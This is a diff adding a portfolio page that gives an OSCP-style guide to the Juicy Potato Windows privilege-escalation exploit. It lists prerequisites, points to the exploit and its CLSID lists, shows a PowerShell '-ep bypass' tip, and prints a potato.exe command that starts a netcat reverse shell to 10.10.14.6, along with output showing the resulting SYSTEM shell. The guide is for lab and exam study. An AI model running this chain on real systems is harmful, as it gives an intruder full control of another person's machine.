@@ -1,0 +1,115 @@
+<!DOCTYPE HTML>
+
+<html>
+	<head>
+		<title>Year of the Pig Writeup | Jonathan Vargas</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
+	</head>
+	<body class="is-preload">
+
+		<!-- Wrapper -->
+			<div id="wrapper">
+
+				<!-- Header -->
+					<header id="header">
+						<a href="index.html" class="logo">Jonathan Vargas</a>
+					</header>
+
+				<!-- Main -->
+					<div id="main">
+
+						<!-- Post -->
+							<section class="post">
+								<header class="major">
+									<span class="date">December 16, 2020</span>
+									<h1>Juicy Potato Exploit Guide
+									</h1>
+								</header>
+
+								<br><br>
+								<p style="text-align:center">The Juicy Potato exploit is an infamous loophole in the Windows operating system that allows most local service accounts to gain system level access. It is a fork of the original Rotten Potato exploit, but since the original binary requires a meterpreter shell to successfully execute, we will be using Juicy Potato — an OSCP exam-friendly alternative. This post is intended to be utilized as a quick field reference when testing vulnerable machines.</p>
+
+								<br><br><br><h2>Contents:</h2>
+								<ol>
+									<li><b><a href='#prereq'>Prerequisites</a></b></li>
+									<li><b><a href='#prep'>Preparing the Snap</a></b></li>
+									<li><b><a href='#snap'>The Snap</a></b></li>
+									<li><b><a href='#errors'>Errors</a></b></li>
+								</ol>
+
+
+
+								<br><br><br>
+								<h2 id="prereq">Prerequisites</h2>
+								<ul>
+								<li>You have obtained a shell as a service account (i.e, NT AUTHORITY\IUSR or NT AUTHORITY\LOCAL SYSTEM)</li>
+								<li>SeImpersonate OR SeAssignPrimaryToken privilege is enabled. </li>
+								<li>WINPEAS or Exploit-Suggester state that the patches preventing this are not installed.</li>
+
+								</ul>
+								<br>
+								<p>When all of the above requirements are satisfied, you can escalate your privileges using Juicy Potato.</p>
+
+								<br><br><br><h2 id="prep">Preparing The Snap</h2>
+								<ol start='' >
+								<li>Download the exploit <a href='https://github.com/ohpe/juicy-potato'>from here</a> and upload it to the victim machine.</li>
+								<li>Get the name of the operating system (i.e, Windows Server 2008 R2 Datacenter)</li>
+								<li>Using the name of the operating system, <a href='https://ohpe.it/juicy-potato/CLSID/'>find a valid CLSID</a> to use for the exploit. This is the token you will be impersonating.</li>
+
+								</ol>
+								<blockquote><p><strong>If you can run powershell scripts and have an interactive shell</strong>, you can download <a href='https://ohpe.it/juicy-potato/CLSID/GetCLSID.ps1'>GetCLSID.ps1</a> to retrieve a list of valid CLSIDs. You may have to run the script with <code>-ep bypass</code> if you are prevented from running scripts on the system.</p>
+								</blockquote>
+								<br><br><br><h2 id="snap">The Snap</h2>
+								<p>Now that you have the PoC on the machine and a valid CLSID to impersonate, you can escalate your privileges.</p>
+								<ol start='' >
+								<li>Start up a netcat listener on the attacker machine.</li>
+								<li>On the victim machine, run the following command to toss back a reverse shell for you to catch.</li>
+
+								</ol>
+								<pre><code>potato.exe -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\nc.exe -e cmd.exe 10.10.14.6 443&quot; -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}</code></pre>
+								<p>Example of successful output:</p>
+								<pre><code>C:\inetpub\drupal-7.54&gt; potato.exe -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.14.6 443&quot; -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
+potato.exe -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.14.6 443&quot; -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
+Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
+....
+[+] authresult 0
+{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK</code></pre>
+								<p>You now have a System shell.</p>
+								<br><br><br><h2 id="errors">Errors</h2>
+								<p><strong>COM -&gt; recv failed with error: 10038</strong>
+								Try a different CLSID. I got lucky with using the one at the top of <a href='https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/'>this list</a>, but it won&#39;t always be that way.</p>
+
+
+
+
+                </body>
+                </html>
+
+						</section>
+
+					</div>
+
+				<!-- Footer -->
+				<!-- Copyright -->
+					<div id="copyright">
+						<ul><li>Jonathan Vargas</li><li>Cybersec Portfolio</li></ul>
+					</div>
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrollex.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
